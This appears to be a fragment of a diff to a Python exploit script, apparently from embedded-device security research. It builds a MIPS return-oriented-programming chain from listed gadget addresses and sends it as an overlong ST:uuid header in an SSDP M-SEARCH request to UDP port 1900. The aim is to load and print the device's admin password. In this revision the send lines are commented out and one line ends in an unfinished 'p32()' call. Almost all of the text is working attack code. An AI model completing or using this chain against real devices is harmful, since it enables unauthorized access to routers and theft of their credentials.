-            rop_chain += to_addr(0xdeadbeef) # s2
-            rop_chain += to_addr(0xdeadbeef) # s3
-            rop_chain += to_addr(0x14d14 + base_address) # ra
+                # sub 0x784 from a1 to get 20 byte shift down
+                # 0x0018bbc0: addiu $a1, $a1, -0x784; lw $ra, 0xc($sp); move $v0, $zero; lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10; 
+                chain += b'b' * 0x4
+                chain += p32(0xdeadbeef) # s0
+                chain += p32(0xdeadbeef) # s1
+                chain += p32(0xaf2d4 + base_address) # ra
+
+            # add 0x770 to a1
+            # 0x000af2d4: addiu $a1, $a1, 0x770; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
+            chain += b'b' * 0x4
+            chain += p32(0x18bbc0 + base_address) # ra
+
+            # sub 0x784 from a1 to get 20 byte shift down
+            # 0x0018bbc0: addiu $a1, $a1, -0x784; lw $ra, 0xc($sp); move $v0, $zero; lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10; 
+            chain += b'b' * 0x4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0x57864 + base_address) # ra
+
+            ## Need to remember where our buffer containing the password is in case we clobber it (currently the address is in a1)
+            # Store on the stack with following gadget
+            # 0x00057958: sw $a1, ($sp); move $a0, $zero; lw $ra, 0xc($sp); move $v0, $a0; lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10; 
+            chain += b'b' * 0x8
+            chain += p32(0x800089e4 + 0x7b58) # s0
+            chain += p32(0x137960 + base_address) # ra
+
+            ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
+            # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x15114 + base_address) # ra
+
+            ## Now call config load
+            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
+            chain += b'b' * 0x4
+            chain += p32(0x181c78 + base_address) # ra
+
+            ### step 2 - print the config value to the console
+            ## Need to shift the stack pointer back down by 0x20
+            # 0x00181c78: move $a0, $sp; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
+            chain += b'b' * 0xc
+            chain += p32()
         else:
             print("[-] Bad type")
             exit(1)
 
-        print(f"Length used: {len(rop_chain)}")
-        print(hexdump(rop_chain))
+        # elif (args.rop[0] == '4'): # turn on an led or something
+        #     # pAd address
+        #     pAd = 0x802d5d78
+
+        #     AndesLedEnhanceOp = 0x80109798 # pAd (a0), led_index (a1), on_time (a2), off_time (a3), led_param (t0)
+            
+        #     # Add the strings to the sX registers, and set the ra to first gadget
+        #     chain += p32(0xdeadbeef) # s0
+        #     chain += p32(0xdeadbeef) # s1
+        #     chain += p32(0xdeadbeef) # s2
+        #     chain += p32(0xdeadbeef) # s3
+        #     chain += p32(0x14d14 + base_address) # ra
+
+        print(f"Length used: {len(chain)}")
+        print(hexdump(chain))
     
         # Build the request
         request = b"M-SEARCH * HTTP/1.0\r\n"
         request += b"HOST:239.255.255.250:1900\r\n"
-        request += b"ST:uuid:" + rop_chain + b"\r\n"
+        request += b"ST:uuid:" + chain + b"\r\n"
         request += b"MX:2\r\n"
         request += b"MAN:\"ssdp:discover\"\r\n\r\n"
         
         # Create socket and connect
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.settimeout(5)
-        s.connect((args.ip, 1900))
+        # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # s.settimeout(5)
+        # s.connect((args.ip, 1900))
 
-        # Send the request
-        s.sendall(request)
-        s.close()
-
-
-#  elif (args.rop[0] == '2'): # print the admin password to the uart (possibly not possible due to null byte stuff)
-#             # Add the strings to the sX registers, and set the ra to first gadget
-#             rop_chain += to_addr(0xdeadbeef) # s0
-#             rop_chain += to_addr(0x80236c4c) # s1 (0x1010200)
-#             rop_chain += to_addr(0xdeadbeef) # s2
-#             rop_chain += to_addr(0xdeadbeef) # s3
-#             rop_chain += to_addr(0x12ba10 + base_address) # ra
-
-#             # set a0 to be the id of the admin password
-#             # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-#             rop_chain += b'a'*4
-#             rop_chain += to_addr(0xdeadbeef) # s0
-#             rop_chain += to_addr(0xdeadbeef) # s1
-#             rop_chain += to_addr(0x104e7c + base_address)
-
-#             # Move sp into a1
-#             # 0x00104e7c: move $a1, $sp; lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
-#             rop_chain += b'a' * 0xc
-#             rop_chain += to_addr(0xdeadbeef) # s0
-#             rop_chain += to_addr(0xdeadbeef) # s1
-#             rop_chain += to_addr(0xaf05c + base_address) # ra
-
-#             ## shift sp down a bit so we can use the buffer we overflowed, shift down 156 bytes
-
-#             # add 0x644 to a1
-#             # 0x000af05c: addiu $a1, $a1, 0x644; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-#             rop_chain += b'b' * 0x4
-#             rop_chain += to_addr(0x18fc34 + base_address) # ra
-
-#             # sub 0x6e0 from a1 to get 156 byte shift down
-#             # 0x0018fc34: addiu $a1, $a1, -0x6e0; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-#             rop_chain += b'b' * 0x4
-#             rop_chain += to_addr(0x57864 + base_address) # ra
-
-#             ## Need to remember where our buffer containing the password is
-
-#             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-#             rop_chain += to_addr(0xb9c1c + base_address) # v0 - # 0x000b9c1c: move $v0, $a1; jr $ra; addiu $sp, $sp, 8;
-#             rop_chain += b'a' * 8
-#             rop_chain += to_addr(0x15114 + base_address) # ra
-
-#             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-#             rop_chain += b'a' * 4
-#             rop_chain += to_addr(0xf09c + base_address) # ra
-
-#             # 0x0000f09c: sw $v0, ($sp); lw $ra, 0xc($sp); addiu $v0, $zero, 8; jr $ra; addiu $sp, $sp, 0x10;
-#             rop_chain += b'a' * 0xc
-#             rop_chain += to_addr(0x57864 + base_address)
-
-#             ## call lm_load_from_config
-#             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-#             rop_chain += to_addr(0x800089e4) # v0 - lm_load_from_config address
-#             rop_chain += b'a' * 8
-#             rop_chain += to_addr(0x15114 + base_address) # ra
-
-#             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-#             rop_chain += b'a' * 4
-#             rop_chain += to_addr(0xdeadbeef) # ra
-
-#             # step 2 - print the config value to the console
+        # # Send the request
+        # s.sendall(request)
+        # s.close()
